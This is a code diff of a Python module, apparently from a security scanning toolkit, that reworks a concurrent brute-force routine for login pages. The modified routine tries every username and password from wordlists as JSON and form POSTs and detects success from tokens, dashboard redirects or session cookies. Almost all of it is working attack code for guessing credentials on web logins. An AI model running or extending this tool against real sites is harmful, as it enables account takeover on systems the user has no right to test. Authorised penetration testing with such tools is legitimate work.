@@ -62,14 +62,9 @@ class CredentialTester(BaseModule):
     # Entry point
     # ─────────────────────────────────────────────────────────────────────────
     async def run(self, target: str, **kwargs) -> List[Finding]:
-        """Run brute force — inserts username+password into the login form and submits"""
-        self.logger.info(f"Starting brute force on {target}")
-
         if not kwargs.get('enable_brute_force', False):
-            self.logger.info("Brute force testing disabled (use --enable-brute-force to enable)")
             return self.findings
 
-        # ── Pull custom wordlists / caps from kwargs ──────────────────────────
         if kwargs.get('userlist'):      self.custom_userlist = kwargs['userlist']
         if kwargs.get('passlist'):      self.custom_passlist = kwargs['passlist']
         if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
@@ -77,30 +72,16 @@ class CredentialTester(BaseModule):
 
         target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
 
-        # ── Step 1: fetch the page and extract form fields ────────────────────
-        print(f"\033[96m[*] Probing login page...\033[0m")
-        endpoint = await self._probe_single_endpoint(target_url)
+        ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
+        plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt"
+        print(f"\033[96m[*] Target   : {target_url}\033[0m")
+        print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
+        print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")
 
-        print(f"\033[96m[*] Form type : \033[93m{endpoint['form_type']}\033[0m")
-        print(f"\033[96m[*] Post URL  : \033[93m{endpoint['url']}\033[0m")
-        print(f"\033[96m[*] User field: \033[93m{endpoint['fields'].get('username_field')}\033[0m")
-        print(f"\033[96m[*] Pass field: \033[93m{endpoint['fields'].get('password_field')}\033[0m")
-
-        # ── Step 2: show wordlist banner ──────────────────────────────────────
-        ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt (default)"
-        plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt (default)"
-        print(f"\033[96m[*] Userlist  : {ulist_label}\033[0m")
-        print(f"\033[96m[*] Passlist  : {plist_label}\033[0m\n")
-
-        if endpoint.get('form_type') == 'firebase_key_missing':
-            return self.findings
-
-        await self._test_brute_force(endpoint)
+        await self._test_brute_force({'url': target_url, 'form_type': 'direct'})
         return self.findings
 
-    # ─────────────────────────────────────────────────────────────────────────
-    # Single fast probe — detects form type INCLUDING Firebase / SPA apps
-    # ─────────────────────────────────────────────────────────────────────────
+
     async def _probe_single_endpoint(self, url: str) -> Dict:
         """
         Fetch the login page, extract the real form fields and POST url.
@@ -565,32 +546,21 @@ class CredentialTester(BaseModule):
     # Core brute-force loop — concurrent with live progress bar
     # ─────────────────────────────────────────────────────────────────────────
     async def _test_brute_force(self, endpoint: Dict):
-        """Concurrent brute force with live progress bar."""
         import itertools
-        import aiohttp
 
-        if endpoint.get('form_type') == 'firebase_key_missing':
-            return
-
-        url        = endpoint['url']
-        form_type  = endpoint.get('form_type', 'html_form')
-        fields     = endpoint.get('fields', {})
-        ufields    = fields.get('username_fields', ['email'])
-        pfield     = fields.get('password_field', 'password')
+        url    = endpoint['url']
+        counter      = [0]
+        found_event  = asyncio.Event()
+        rate_limited = [False]
+        semaphore    = asyncio.Semaphore(self.concurrency)
 
         base_usernames, passwords = self._load_wordlists()
         all_usernames  = list(dict.fromkeys(base_usernames))
         total_attempts = len(all_usernames) * len(passwords)
 
-        print(f"\033[96m[*] Usernames  : {len(all_usernames)}\033[0m")
-        print(f"\033[96m[*] Passwords  : {len(passwords)}\033[0m")
-        print(f"\033[96m[*] Total      : {total_attempts}\033[0m")
-        print(f"\033[96m[*] Workers    : {self.concurrency}\033[0m\n")
-
-        semaphore   = asyncio.Semaphore(self.concurrency)
-        found_event = asyncio.Event()
-        counter     = [0]
-        rate_limited = [False]
+        print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
+        print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
+        print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")
 
         async def attempt(username: str, password: str):
             if found_event.is_set():
@@ -599,89 +569,81 @@ class CredentialTester(BaseModule):
                 if found_event.is_set():
                     return
                 try:
-                    # ── Build request ─────────────────────────────────────
-                    if form_type == 'firebase':
-                        body    = {'email': username, 'password': password, 'returnSecureToken': True}
-                        req_kw  = {'json': body}
-                        hdrs    = {'Content-Type': 'application/json'}
-                    elif form_type in ('json_api', 'jwt_login', 'ajax_form'):
-                        body    = {pfield: password}
-                        for f in ufields: body[f] = username
-                        req_kw  = {'json': body}
-                        hdrs    = {'Content-Type': 'application/json'}
-                    else:
-                        body    = {pfield: password}
-                        for f in ufields: body[f] = username
-                        req_kw  = {'data': body}
-                        hdrs    = {'Content-Type': 'application/x-www-form-urlencoded'}
+                    # Try JSON first (Firebase / API), fall back to form POST
+                    resp = await self._make_request(
+                        url, method='POST',
+                        json={'email': username, 'password': password, 'returnSecureToken': True},
+                        allow_redirects=False,
+                        headers={'Content-Type': 'application/json'})
 
-                    # ── Send request directly via aiohttp ─────────────────
-                    timeout = aiohttp.ClientTimeout(total=15)
-                    async with aiohttp.ClientSession(timeout=timeout) as session:
-                        async with session.post(url, headers=hdrs,
-                                                ssl=False, allow_redirects=False,
-                                                **req_kw) as resp:
-                            status  = resp.status
-                            text    = await resp.text()
-                            resp_hdrs = resp.headers
+                    # If JSON failed or got 415/400, retry as form POST
+                    if not resp or resp.status in [400, 415]:
+                        body = {'email': username, 'username': username, 'password': password}
+                        resp = await self._make_request(
+                            url, method='POST', data=body,
+                            allow_redirects=False,
+                            headers={'Content-Type': 'application/x-www-form-urlencoded'})
 
                     counter[0] += 1
                     self._print_progress(counter[0], total_attempts,
                                          prefix=f'  \033[96m{username[:22]:<22}\033[0m')
 
-                    # ── Always show response on first attempt for debugging ─
+                    if not resp:
+                        return
+
+                    status = resp.status
+                    text   = await resp.text()
+                    tl     = text.lower()
+
+                    # Always show first response so user can verify
                     if counter[0] == 1:
                         sys.stdout.write('\n')
-                        print(f"\033[90m[debug] HTTP {status} | {text[:200]}\033[0m\n")
+                        print(f"\033[90m[debug] HTTP {status} | {text[:300]}\033[0m\n")
 
-                    # ── Rate limit ────────────────────────────────────────
                     if status == 429:
                         rate_limited[0] = True
                         found_event.set()
                         return
 
-                    # ── Success detection ─────────────────────────────────
-                    tl = text.lower()
+                    # ── SUCCESS ───────────────────────────────────────────
+                    success = False
 
-                    # Firebase success: contains idToken
-                    if any(k in tl for k in ['idtoken', 'localid', 'refreshtoken']):
+                    # Firebase success
+                    if any(k in tl for k in ['idtoken', '"localid"', 'refreshtoken']):
+                        success = True
+
+                    # Redirect to success page
+                    elif status in [301, 302, 303, 307, 308]:
+                        loc = resp.headers.get('Location', '').lower()
+                        if any(p in loc for p in ['/dashboard','/admin','/home','/panel','/welcome','/main']):
+                            success = True
+
+                    # JSON token (non-Firebase)
+                    elif 'application/json' in resp.headers.get('Content-Type',''):
+                        if '"error"' not in tl and any(k in tl for k in ['token','access_token','auth']):
+                            success = True
+
+                    # HTML: session cookie set + no error words
+                    elif status == 200:
+                        fail_words = ['invalid','incorrect','failed','wrong','denied',
+                                      'unauthorized','error','bad credentials','not found']
+                        cookie = resp.headers.get('Set-Cookie','').lower()
+                        if any(c in cookie for c in ['session','token','auth','jwt']):
+                            if not any(f in tl for f in fail_words):
+                                success = True
+
+                    if success:
                         sys.stdout.write('\n')
-                        self._report_success(username, password, url, counter[0], ufields, pfield)
+                        self._report_success(username, password, url, counter[0],
+                                             ['email','username'], 'password')
                         found_event.set()
-                        return
-
-                    # Redirect to dashboard
-                    if status in [301, 302, 303, 307, 308]:
-                        loc = resp_hdrs.get('Location', '').lower()
-                        if any(p in loc for p in ['/dashboard','/admin','/home','/panel','/welcome']):
-                            sys.stdout.write('\n')
-                            self._report_success(username, password, url, counter[0], ufields, pfield)
-                            found_event.set()
-                            return
-
-                    # JSON token response
-                    if 'application/json' in resp_hdrs.get('Content-Type',''):
-                        if any(k in tl for k in ['access_token','auth_token','"token"']) and '"error"' not in tl:
-                            sys.stdout.write('\n')
-                            self._report_success(username, password, url, counter[0], ufields, pfield)
-                            found_event.set()
-                            return
-
-                    # Session cookie set
-                    cookie = resp_hdrs.get('Set-Cookie','').lower()
-                    if status == 200 and any(c in cookie for c in ['session','token','auth','jwt']):
-                        fail_words = ['invalid','incorrect','failed','wrong','denied','error']
-                        if not any(f in tl for f in fail_words):
-                            sys.stdout.write('\n')
-                            self._report_success(username, password, url, counter[0], ufields, pfield)
-                            found_event.set()
 
                 except asyncio.CancelledError:
                     raise
                 except Exception as e:
                     counter[0] += 1
                     sys.stdout.write('\n')
-                    print(f"\033[91m[error] {username}:{password} → {e}\033[0m")
+                    print(f"\033[91m[!] {username} → {type(e).__name__}: {e}\033[0m")
 
         tasks = [asyncio.create_task(attempt(u, p))
                  for u, p in itertools.product(all_usernames, passwords)]
